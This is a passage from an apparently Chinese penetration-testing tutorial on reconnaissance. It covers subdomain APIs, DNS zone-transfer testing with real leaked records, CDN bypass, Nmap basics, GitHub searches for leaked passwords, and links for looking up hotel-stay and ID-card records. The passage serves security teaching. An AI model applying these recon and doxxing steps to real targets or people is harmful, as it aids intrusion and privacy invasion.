class="line">https://api.hackertarget.com/hostsearch/?q=&#123;domain&#125;</span><br><span class="line"></span><br><span class="line"># IP138</span><br><span class="line">https://site.ip138.com/&#123;domain&#125;/domain.htm</span><br><span class="line"></span><br><span class="line"># crt.sh SSL 证书反查</span><br><span class="line">https://crt.sh/?q=%25.&#123;domain&#125;</span><br><span class="line"></span><br><span class="line"># 千寻</span><br><span class="line">url = &apos;https://www.dnsscan.cn/dns.html&apos;</span><br><span class="line">datas = &#123;&quot;ecmsfrom&quot;: &apos;8.8.8.8&apos;, &quot;show&quot;: &apos;none&apos;, &quot;keywords&quot;: domain&#125;</span><br></pre></td></tr></table></figure></p><p><strong>API接口找子域名比爆破更好用的原因：</strong></p><ul><li>大厂SRC 2级往上子域名很多，用字典爆破难以成功</li><li>大厂会有WAF拦截</li></ul><p>域名访问超时直接丢弃结果的，然后再获取网页标题，这个在实际的信息收集中比较实用的，一些 404 403 的资产可以跳过，减少无意义的浪费时间。</p><p>证书透明度(CT)是为了防止证书授权机构(CA)或者其他恶意人员伪造服务器证书而诞生的一个项目。</p><p>CT会要求CA将数字证书(SSL/TLS证书)公开并发布将颁发记录同步到日志服务器中。而日志服务器则会提供给用户一个查找某域名颁发的所有数字证书途径。数字证书中会包含子域名相关的信息。</p><h3 id="DNS-域传送漏洞"><a href="#DNS-域传送漏洞" class="headerlink" title="DNS 域传送漏洞"></a>DNS 域传送漏洞</h3><h4 id="什么是DNS"><a href="#什么是DNS" class="headerlink" title="什么是DNS"></a>什么是DNS</h4><p>DNS(Domain Name System，域名管理系统) 是万维网 WWW 的重要基础。它建立在一个分布式数据库基础之上，在这个数据库里，保存了IP地址和域名的相互映射关系。</p><p>DNS服务器使用的TCP/UDP端口号是53。</p><p>最常用的DNS记录有以下几类：</p><table><thead><tr><th>记录类别</th><th>说明</th></tr></thead><tbody><tr><td>A记录</td><td>IP 地址记录,记录一个域名对应的 IP 地址</td></tr><tr><td>AAAA 记录</td><td>IPv6 地址记录，记录一个域名对应的 IPv6 地址</td></tr><tr><td>CNAME 记录</td><td>别名记录，记录一个主机的别名</td></tr><tr><td>MX 记录</td><td>电子邮件交换记录，记录一个邮件域名对应的IP地址</td></tr><tr><td>NS 记录</td><td>域名服务器记录 ,记录该域名由哪台域名服务器解析</td></tr><tr><td>PTR 记录</td><td>反向记录，也即从 IP 地址到域名的一条记录</td></tr><tr><td>TXT 记录</td><td>记录域名的相关文本信息</td></tr></tbody></table><h4 id="nslookup-命令"><a href="#nslookup-命令" class="headerlink" title="nslookup 命令"></a>nslookup 命令</h4><p>nslookup 命令的使用。仅使用该命令，就可完成 DNS 域传送的测试。</p><p>指定 DNS 查询域名的 IP 地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~ nslookup www.sqlsec.com 114.114.114.114</span><br><span class="line">Server:        114.114.114.114</span><br><span class="line">Address:    114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:    www.sqlsec.com</span><br><span class="line">Address: 121.196.37.183</span><br></pre></td></tr></table></figure></p><p>查询域名所使用的 DNS 服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nslookup www.sqlsec.com -type=ns</span><br><span class="line">Server:        100.100.2.136</span><br><span class="line">Address:    100.100.2.136#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:    www.sqlsec.com</span><br><span class="line">Address: 121.196.37.183</span><br></pre></td></tr></table></figure><p>验证一下看看，是否这个 DNS 服务器开启了 53 端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nmap 100.100.2.136</span><br><span class="line"></span><br><span class="line">Starting Nmap 6.40 ( http://nmap.org ) at 2020-07-25 14:32 CST</span><br><span class="line">Nmap scan report for 100.100.2.136</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds</span><br></pre></td></tr></table></figure><h4 id="域传送漏洞"><a href="#域传送漏洞" class="headerlink" title="域传送漏洞"></a>域传送漏洞</h4><p>DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</p><p>若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。</p><p>Nslookup 命令检测：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> # 查询解析此域名的dns服务器</span><br><span class="line">nslookup -type=ns xxx.xxx.cn</span><br><span class="line"></span><br><span class="line"># 进入交互</span><br><span class="line">nslookup  </span><br><span class="line"></span><br><span class="line"># 指定dns服务器</span><br><span class="line">server dns.xxx.xx.cn</span><br><span class="line"></span><br><span class="line"># 列出域信息</span><br><span class="line">ls xxx.xxx.cn</span><br></pre></td></tr></table></figure></p><p>详细案例的输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">D:\&gt;nslookup</span><br><span class="line">默认服务器:  public1.114dns.com</span><br><span class="line">Address:  114.114.114.114</span><br><span class="line"></span><br><span class="line">&gt; server dns.nwpu.edu.cn</span><br><span class="line">默认服务器:  dns.nwpu.edu.cn</span><br><span class="line">Address:  202.117.80.2</span><br><span class="line"></span><br><span class="line">&gt; ls nwpu.edu.cn</span><br><span class="line">[dns.nwpu.edu.cn]</span><br><span class="line"> nwpu.edu.cn.                   NS     server = dns.nwpu.edu.cn</span><br><span class="line"> nwpu.edu.cn.                   NS     server = dns1.nwpu.edu.cn</span><br><span class="line"> nwpu.edu.cn.                   NS     server = dns2.nwpu.edu.cn</span><br><span class="line"> nwpu.edu.cn.                   NS     server = dns3.nwpu.edu.cn</span><br><span class="line"> *                              A      222.24.192.99</span><br><span class="line">(... 省略大量的记录) </span><br><span class="line">npunecas                       NS     server = webcomp.npunecas.nwpu.edu.cn</span><br><span class="line"> webcomp.npunecas               A      202.117.85.146</span><br><span class="line"> nwpu03                         A      202.117.80.4</span><br><span class="line"> nwpudb2                        A      222.24.210.149</span><br><span class="line"> poj                            A      192.168.0.248</span><br><span class="line"> portal                         A      61.150.43.10</span><br><span class="line"> portal1                        A      222.24.192.31</span><br><span class="line"> portal2                        A      222.24.192.32</span><br><span class="line"> rei                            A      202.117.85.10</span><br><span class="line"> saip                           NS     server = saipserver.saip.nwpu.edu.cn</span><br><span class="line"> saipserver.saip                A      202.117.85.72</span><br><span class="line"> test                           A      222.24.192.29</span><br><span class="line"> yzb                            A      202.117.85.3</span><br><span class="line"> zsb                            A      202.117.87.130</span><br><span class="line"> zygx                           A      202.117.80.9</span><br></pre></td></tr></table></figure></p><h2 id="C段与旁站-渐渐没落"><a href="#C段与旁站-渐渐没落" class="headerlink" title="C段与旁站(渐渐没落)"></a>C段与旁站(渐渐没落)</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="什么是-IP-地址"><a href="#什么是-IP-地址" class="headerlink" title="什么是 IP 地址"></a>什么是 IP 地址</h4><p>IP 地址在网络中用于标识一个节点（或者网络设备的接口），一个IPv4地址有32位。</p><table><thead><tr><th>192.</th><th>168.</th><th>10.</th><th>1</th></tr></thead><tbody><tr><td>11000000</td><td>10101000</td><td>00001010</td><td>00000001</td></tr></tbody></table><p>IP地址在最底层运算的时候依然采用的是二进制的方式。</p><h4 id="IP地址的类别"><a href="#IP地址的类别" class="headerlink" title="IP地址的类别"></a>IP地址的类别</h4><p>0.0.0.0 - 255.255.255.255 一共有2的32次方个，因为数量很庞大，所以需要科学的管理。<br>我们一般把IP地址划分为如下5个类别：</p><p><img src="http://qiniuyun.lintstar.top/image-20200725110133223.png" alt="image-20200725110133223"></p><p>正常可以被我们使用的只有A、B、C类<br>A 类</p><ul><li>00000001 - 01111111 : 0 - 127<br>0 是不合法的 IP 地址，所以范围从 1 开始，又因为 127 是一个比较特殊的地址，回环地址，所以 A 类的第一个 8 bit 的值范围为 1-126</li></ul><p>B 类</p><ul><li><p>10000000 - 10111111 : 128 - 191<br>C 类</p></li><li><p>11000000 - 11011111 : 192 - 223<br>所以在内网渗透中，遇到 10 开头的 IP 地址，一般我们称呼它为 A 类地址，172 开头的IP地址为 B 类地址，192 开头的IP地址为 C 类地址。</p></li></ul><h4 id="IP-地址的网络和主机部分"><a href="#IP-地址的网络和主机部分" class="headerlink" title="IP 地址的网络和主机部分"></a>IP 地址的网络和主机部分</h4><p>IP 地址和我们实际生活中的地址类似：</p><p>浙江省杭州市滨江区西兴街道联慧街188号安恒大厦<br>浙江省 | 杭州市 滨江区 西兴街道联慧街188号<br>网络号 | 主机号<br>所以在网络中间对于转发信息的设备来说，他们不关心主机号，所以路由是不关心主机部分的，先把信息送到目标网络区域，然后交给对于的网络区域的设备来处理。</p><p><img src="http://qiniuyun.lintstar.top/image-20200725111813506.png" alt="image-20200725111813506"></p><p>所以一个 IP 地址为：10.1.1.1 ，那么 10.0.0.0 为这个 IP 地址的网络号，1.1.1 为这个 IP 地主的主机号。</p><h4 id="网络掩码"><a href="#网络掩码" class="headerlink" title="网络掩码"></a>网络掩码</h4><ul><li>网络掩码为 32 bits，与 IP 地址的位数是一样的</li><li>网络掩码在二进制的表示上是一堆连续的 1 后面接连续的 0</li><li>值为 1 的 bit 对应 IP 地址中的网络位；为 0 的 bit 对应 IP 地址中的主机位，以此来辅助我们识别一个 IP 地址中的网络与主机位</li></ul><p><img src="http://qiniuyun.lintstar.top/20200802010505.png" alt="20200802010505"></p><h3 id="A-段-B-段-C-段"><a href="#A-段-B-段-C-段" class="headerlink" title="A 段 B 段 C 段"></a>A 段 B 段 C 段</h3><h4 id="黑客所说的C段是什么意思"><a href="#黑客所说的C段是什么意思" class="headerlink" title="黑客所说的C段是什么意思?"></a>黑客所说的C段是什么意思?</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.1/24</span><br><span class="line">192.168.1.1 - 192.168.1.255</span><br></pre></td></tr></table></figure><p>子网掩码的位数总共有 32 个, /24表示前 24 个为1，其它 8 位都是 0<br>所以 B 段 可以用下面来进行表示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">172.1.1.1/16</span><br><span class="line">172.1.1.1 - 172.1.255.255</span><br></pre></td></tr></table></figure></p><p>A 段 可以用下面来进行表示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.1.1.1/8</span><br><span class="line">10.1.1.1 - 10.255.255.255</span><br></pre></td></tr></table></figure><p>一般渗透测试中常用于 C 段探测，内网中会对 B 段进行探测扫描，A 段资产太庞大，探测成本太高。</p><p><strong><code>多地 ping 原理：根据不同地区CDN加速提高响应速度，因此ip会不一样</code></strong></p><h3 id="必应接口-没落"><a href="#必应接口-没落" class="headerlink" title="必应接口(没落)"></a>必应接口(没落)</h3><h4 id="在线查询"><a href="#在线查询" class="headerlink" title="在线查询"></a>在线查询</h4><p><strong><a href="http://www.bug8.me/bing/bing.php" target="_blank" rel="noopener">http://www.bug8.me/bing/bing.php</a></strong></p><p>在线网站使用必应接口查询 C 段和旁站很方便，但是速度方面有点欠缺</p><h4 id="K8-C段旁注工具-6-0"><a href="#K8-C段旁注工具-6-0" class="headerlink" title="K8 C段旁注工具 6.0"></a>K8 C段旁注工具 6.0</h4><p><strong><a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a></strong></p><p>K8 C 段旁注查询工具 V6.0，但是速度要比在线快很多，解压密码为：k8team</p><h4 id="爱站"><a href="#爱站" class="headerlink" title="爱站"></a>爱站</h4><p><strong><a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a></strong></p><p>数量上还是比较优势的，而且查询速度也会比较快。</p><h4 id="Fofa"><a href="#Fofa" class="headerlink" title="Fofa"></a>Fofa</h4><p>获取到域名的 IP 地址之后，可以使用 Fofa 来反查域名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=&quot;119.23.84.105&quot; &amp;&amp; type=&quot;subdomain&quot;</span><br></pre></td></tr></table></figure></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>更多适用于内网，因为外网基本上开放端口都比较少，而且带云 WAF。</p><h4 id="HTTPScan"><a href="#HTTPScan" class="headerlink" title="HTTPScan"></a>HTTPScan</h4><p><strong><a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a></strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">python httpscan.py 220.191.202.0/24</span><br></pre></td></tr></table></figure></p><p><img src="http://qiniuyun.lintstar.top/20200802083757.png" alt="20200802083757"></p><h4 id="http端口查询-标题获取"><a href="#http端口查询-标题获取" class="headerlink" title="http端口查询+标题获取"></a>http端口查询+标题获取</h4><p>首先实用快速端口扫描工具：</p><p><img src="http://qiniuyun.lintstar.top/20200802083911.png" alt="20200802083911"></p><p>然后提取出ip地址信息，再放到爱站里面取查询，这样可以得出一个最完整的c段信息。</p><p>当旁站不是CDN的时候，适用于内网，可以使用批量获取网页标题工具来进行查询：</p><p><img src="http://qiniuyun.lintstar.top/1558963651187.png" alt="1558963651187"></p><h2 id="服务器信息查询"><a href="#服务器信息查询" class="headerlink" title="服务器信息查询"></a>服务器信息查询</h2><h3 id="CDN-介绍"><a href="#CDN-介绍" class="headerlink" title="CDN 介绍"></a>CDN 介绍</h3><p>CDN（Content Delivery Network，内容分发网络）将源站的内容发布到接近用户的网络“边缘”，用户可以就近获取所需数据，不仅降低了网络的拥塞状况、提高请求的响应速度，也能够减少源站的负载压力。</p><p><strong>传统的网络访问过程：</strong></p><p><img src="http://qiniuyun.lintstar.top/image-20200725145502796.png" alt="image-20200725145502796"></p><p>访问过程大概如下：</p><pre><code>1.用户输入访问的域名，操作系统向LocalDNS查询域名的ip地址2.LocalDns向RootDNS 查询域名的授权服务器3.RootDNS查询域名记录后，回应给LocalDNS4.LocalDNS将得到的域名ip地址，回应给客户端5.用户得到域名ip地址后，访问站点服务器6.站点服务器应答请求，将内容返回给客户端</code></pre><p><strong>CDN 访问过程：</strong></p><p><img src="http://qiniuyun.lintstar.top/image-20200725145945806.png" alt="image-20200725145945806"></p><p>访问过程大概如下：</p><pre><code>1.用户输入访问的域名，操作系统向 LocalDns 查询域名的 ip 地址2.LocalDns 向 ROOT DNS 查询域名的授权服务器3.ROOT DNS 将域名授权DNS记录回应给 LocalDns4.LocalDns 得到域名记录后，向智能调度DNS查询域名的ip地址5.智能调度DNS 根据一定的算法和策略(比如静态拓扑，容量等),将最适合的CDN节点ip地址回应给 LocalDns6.LocalDns 将得到的域名ip地址，回应给 用户端7.用户得到域名 ip 地址后，访问站点服务器8.CDN节点服务器应答请求，将内容返回给客户端</code></pre><h3 id="CDN-判断与绕过"><a href="#CDN-判断与绕过" class="headerlink" title="CDN 判断与绕过"></a>CDN 判断与绕过</h3><h4 id="ping-命令"><a href="#ping-命令" class="headerlink" title="ping 命令"></a>ping 命令</h4><p>直接 ping 查询地址信息：</p><p><img src="http://qiniuyun.lintstar.top/1558999835083.png" alt="1558999835083"></p><p>有些是直接可以看到waf、cdn等字样的域名</p><p>很多厂商可能让 www 使用cdn，空域名不使用 CDN 缓存。所以直接 ping xxx.com 可能就能得到真实IP</p><h4 id="slookup-查询"><a href="#slookup-查询" class="headerlink" title="slookup 查询"></a>slookup 查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 用了 CDN</span><br><span class="line">➜  ~ nslookup www.baidu.com</span><br><span class="line">Server:        10.20.120.150</span><br><span class="line">Address:    10.20.120.150#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">www.baidu.com    canonical name = www.a.shifen.com.</span><br><span class="line">Name:    www.a.shifen.com</span><br><span class="line">Address: 180.101.49.11</span><br><span class="line">Name:    www.a.shifen.com</span><br><span class="line">Address: 180.101.49.12</span><br><span class="line"></span><br><span class="line"># 没有用 CDN</span><br><span class="line">➜  ~ nslookup www.sqlsec.com</span><br><span class="line">Server:        10.20.120.150</span><br><span class="line">Address:    10.20.120.150#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:    www.sqlsec.com</span><br><span class="line">Address: 121.196.37.183</span><br></pre></td></tr></table></figure><p>域名解析结果为多个 ip，多半使用了CDN，是不真实的 ip。</p><h4 id="多地-ping"><a href="#多地-ping" class="headerlink" title="多地 ping"></a>多地 ping</h4><ul><li>爱站超级 ping: <a href="https://ping.aizhan.com/" target="_blank" rel="noopener">https://ping.aizhan.com/</a></li><li>站长之家多地 ping: <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a></li><li>解析历史记录查询<br>查询<ul><li>ip 与域名绑定历史记录，可能会发现使用 CDN 之前的目标 ip。</li><li><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a></li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></li><li><a href="https://sitereport.netcraft.com/" target="_blank" rel="noopener">https://sitereport.netcraft.com/</a></li></ul></li></ul><h4 id="子域名绕过"><a href="#子域名绕过" class="headerlink" title="子域名绕过"></a>子域名绕过</h4><p>很多网站主站的访问量会比较大。所以往往主站都是挂了CDN的，但是分站就不一定了，毕竟CDN要钱，而且也不便宜,企业业务线众多，有些站点的主站使用了CDN，或者部分域名使用了CDN，某些子域名可能未使用，结合之前的子域名爆破来进行收集。</p><h4 id="利用站点功能主动发起请求"><a href="#利用站点功能主动发起请求" class="headerlink" title="利用站点功能主动发起请求"></a>利用站点功能主动发起请求</h4><p>一些网提供注册服务，可能会验证邮件，还有 RSS 订阅邮件、忘记密码等等 可能服务器本身自带 sendmail 可以直接发送邮件，当然使用第三方的除外（如网易、腾讯的等）通过邮件发送地址往往也能得到服务器 IP</p><h4 id="利用网站漏洞"><a href="#利用网站漏洞" class="headerlink" title="利用网站漏洞"></a>利用网站漏洞</h4><p>如果目标站点存在漏洞，这就没办法避免了。例如 phpinfo 敏感信息泄露、Struts2、网页源代码泄露、svn 信息泄露信、Github 信息泄露等</p><p>若存在 Web 漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实 ip，例如 XSS 等</p><h4 id="国外访问"><a href="#国外访问" class="headerlink" title="国外访问"></a>国外访问</h4><p>国内的 CDN 往往只会针对国内用户访问加速，但是国外就不一定了。因此通过国外代理访问就能查看真实 IP 了，或者通过国外的 DNS 解析，可能就能得到真实的 IP</p><h2 id="社工信息收集"><a href="#社工信息收集" class="headerlink" title="社工信息收集"></a>社工信息收集</h2><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p><strong>whois.bugscaner.com</strong></p><p><img src="http://qiniuyun.lintstar.top/20200802084139.png" alt="20200802084139"></p><p><strong>whois.aizhan.com</strong></p><p><strong>whois.chinaz.com</strong></p><h3 id="注册网站查询"><a href="#注册网站查询" class="headerlink" title="注册网站查询"></a>注册网站查询</h3><p><strong><a href="http://www.reg007.com" target="_blank" rel="noopener">www.reg007.com</a></strong></p><h3 id="密码泄露查询"><a href="#密码泄露查询" class="headerlink" title="密码泄露查询"></a>密码泄露查询</h3><p><a href="https://haveibeenpwned.com" target="_blank" rel="noopener">https://haveibeenpwned.com</a></p><h3 id="TG-群信息收集"><a href="#TG-群信息收集" class="headerlink" title="TG 群信息收集"></a>TG 群信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键词 inurl:t.me</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200801233335.png" alt="20200801233335"></p><h3 id="开房记录查询"><a href="#开房记录查询" class="headerlink" title="开房记录查询"></a>开房记录查询</h3><p><a href="http://www.cxjlkf.com" target="_blank" rel="noopener">http://www.cxjlkf.com</a></p><h3 id="国家职业资格证查询"><a href="#国家职业资格证查询" class="headerlink" title="国家职业资格证查询"></a>国家职业资格证查询</h3><p><a href="http://zscx.osta.org.cn" target="_blank" rel="noopener">http://zscx.osta.org.cn</a></p><h3 id="其他查询"><a href="#其他查询" class="headerlink" title="其他查询"></a>其他查询</h3><h4 id="身份证查询"><a href="#身份证查询" class="headerlink" title="身份证查询"></a>身份证查询</h4><p><a href="http://www.2cha.com" target="_blank" rel="noopener">http://www.2cha.com</a></p><h4 id="经纬度查询"><a href="#经纬度查询" class="headerlink" title="经纬度查询"></a>经纬度查询</h4><p><a href="http://www.gpsspg.com/maps.htm" target="_blank" rel="noopener">http://www.gpsspg.com/maps.htm</a></p><p><a href="http://map.yanue.net/" target="_blank" rel="noopener">http://map.yanue.net/</a></p><p><a href="http://www.gzhatu.com/jingweidu.html" target="_blank" rel="noopener">http://www.gzhatu.com/jingweidu.html</a></p><h4 id="微信搜索"><a href="#微信搜索" class="headerlink" title="微信搜索"></a>微信搜索</h4><p><a href="https://weixin.sogou.com" target="_blank" rel="noopener">https://weixin.sogou.com</a></p><h4 id="泄露网站查询"><a href="#泄露网站查询" class="headerlink" title="泄露网站查询"></a>泄露网站查询</h4><p><a href="https://haveibeenpwned.com/PwnedWebsites" target="_blank" rel="noopener">https://haveibeenpwned.com/PwnedWebsites</a></p><h4 id="邮件泄露查询"><a href="#邮件泄露查询" class="headerlink" title="邮件泄露查询"></a>邮件泄露查询</h4><p><a href="https://www.hotsheet.com/inoitsu/" target="_blank" rel="noopener">https://www.hotsheet.com/inoitsu/</a></p><h4 id="密码强度检测"><a href="#密码强度检测" class="headerlink" title="密码强度检测"></a>密码强度检测</h4><p><a href="https://passwordsecurity.info" target="_blank" rel="noopener">https://passwordsecurity.info</a></p><p><a href="https://haveibeenpwned.com/Passwords" target="_blank" rel="noopener">https://haveibeenpwned.com/Passwords</a></p><h3 id="Github-信息收集"><a href="#Github-信息收集" class="headerlink" title="Github 信息收集"></a>Github 信息收集</h3><p>可以使用谷歌搜索语法：</p><p><img src="http://qiniuyun.lintstar.top/20200801230948.png" alt="20200801230948"></p><p>也可以使用 Github 自带搜索（推荐）：</p><p><img src="http://qiniuyun.lintstar.top/20200801233524.png" alt="20200801233524"></p><p>linux密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql数据库 </span><br><span class="line">password </span><br><span class="line">db_pass</span><br></pre></td></tr></table></figure><p>点code查</p><p><img src="http://qiniuyun.lintstar.top/20200802093603.png" alt="20200802093603"></p><p><a href="https://github.com/xiao1230546/www.zhanglitong.com/blob/b34e59eb93ad419a216093e1705853f054aea1f0/%E5%B9%B3%E5%8F%B0%E8%B5%84%E6%96%99.txt" target="_blank" rel="noopener">https://github.com/xiao1230546/www.zhanglitong.com/blob/b34e59eb93ad419a216093e1705853f054aea1f0/%E5%B9%B3%E5%8F%B0%E8%B5%84%E6%96%99.txt</a></p><h2 id="Nmap-与-Masscan"><a href="#Nmap-与-Masscan" class="headerlink" title="Nmap 与 Masscan"></a>Nmap 与 Masscan</h2><h3 id="Nmap-介绍"><a href="#Nmap-介绍" class="headerlink" title="Nmap 介绍"></a>Nmap 介绍</h3><p>官网：<a href="https://nmap.org/" target="_blank" rel="noopener">https://nmap.org/</a></p><p>Nmap 的英文全称是“Nmap Network Mapper”，中文翻译过来就是“网络映射器”。 Nmap 是一款开源的端口扫描神器，它可以快速地扫描大型网络也可以扫描单个主机。</p><p>端口扫描是指人为发送一组端口扫描信息，试图以了解某台计算机的弱点，并了解其提供的计算机网络服务类型。</p><h3 id="端口介绍"><a href="#端口介绍" class="headerlink" title="端口介绍"></a>端口介绍</h3><p>####　TCP 端口</p><p>TCP是一种面向有连接的传输协议，只有确认通信对端存在时，才会发送数据，从而可以控制通信流量的浪费。同时，TCP还充分实现数据传输过程中的各种控制，可以再数据丢包 的时候重发，还可以对次序乱掉的分包进行顺序控制。</p><h4 id="UDP-端口"><a href="#UDP-端口" class="headerlink" title="UDP 端口"></a>UDP 端口</h4><p>UDP传输不提供复杂的控制机制，它利用IP提供面向无连接的通信服务。UDP报文没有可靠性保证，顺序保证，和流量控制，可靠性比较差，传输过程中即使出现包丢失也不会重发。 也正是因为这些，它的资源消耗小，传输速度快，通常音频，视频在传送时用UDP传输较多。</p><h4 id="协议端口"><a href="#协议端口" class="headerlink" title="协议端口"></a>协议端口</h4><p>端口如同是一个房间的门，这个房间有多少个门呢？有65536 个之多，也就是说端口的取值范围是 0~65535 个。本地操作系统会给那些有需求的进程分配协议端口，每个协议端口有一个正整数标识，如 80、139、445 等。</p><table><thead><tr><th>端口</th><th>协议</th></tr></thead><tbody><tr><td>21</td><td>FTP</td></tr><tr><td>22</td><td>SSH</td></tr><tr><td>23</td><td>Tenet 服务</td></tr><tr><td>25</td><td>SMTP 邮件传输协议</td></tr><tr><td>80</td><td>HTTP 服务相关端口</td></tr><tr><td>110</td><td>POP3 E-mail</td></tr><tr><td>135</td><td>共享文件或共享打印机</td></tr><tr><td>443</td><td>HTTP 服务相关常用端口 SSL</td></tr><tr><td>445</td><td>文件或打印机共享服务</td></tr><tr><td>1433</td><td>MS SQL Server 数据库</td></tr><tr><td>1521</td><td>Oracle 数据库</td></tr><tr><td>3306</td><td>MySQL 数据库</td></tr><tr><td>3389</td><td>Windows 远程桌面服务</td></tr><tr><td>5432/5433</td><td>PostgreSQL 数据库端口</td></tr><tr><td>6379</td><td>Redis 存储默认端口</td></tr><tr><td>7001</td><td>Weblogic 默认端口</td></tr><tr><td>8080</td><td>HTTP 服务常用端口</td></tr><tr><td>8000 - 8100</td><td>HTTP 服务常用端口</td></tr><tr><td>9200</td><td>Elasticsearch 默认端口</td></tr><tr><td>11211</td><td>Memcached 分布式缓存系统端口</td></tr></tbody></table><h3 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h3><p>Nmap 进行端口扫描的时候，Nmap 会把扫描到的端口信息反馈回来，我们从反馈回来的信息就可以判断目标端口情况。</p><table><thead><tr><th>状态</th><th>说明</th><th></th></tr></thead><tbody><tr><td>Open</td><td>端口对外开放</td></tr><tr><td>Closed</td><td>端口对外关闭</td></tr><tr><td>Fitered</td><td>无法判断</td><td>被防火墙设备拦截过滤</td></tr><tr><td>nfiltered</td><td>未被过滤</td><td>使用 ACK 扫描才可能出现这种情况</td></tr><tr><td>Open\</td><td>Filtered</td><td>不能确定开放或者过滤 可能被专业设备阻止探测了</td></tr><tr><td>Closed\</td><td>Filtered</td><td>不能确定关闭还是被过滤</td></tr></tbody></table><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>本节所用到的 Nmap 命令表：</p><table><thead><tr><th>选项</th><th>解释</th></tr></thead><tbody><tr><td>-sP</td><td>Ping 扫描</td></tr><tr><td>-P0/-Pn</td><td>无 Ping 扫描</td></tr><tr><td>-PS</td><td>TCP SYN Ping 扫描</td></tr><tr><td>-PA</td><td>TCP ACK Ping 扫描</td></tr><tr><td>-PU</td><td>UDP 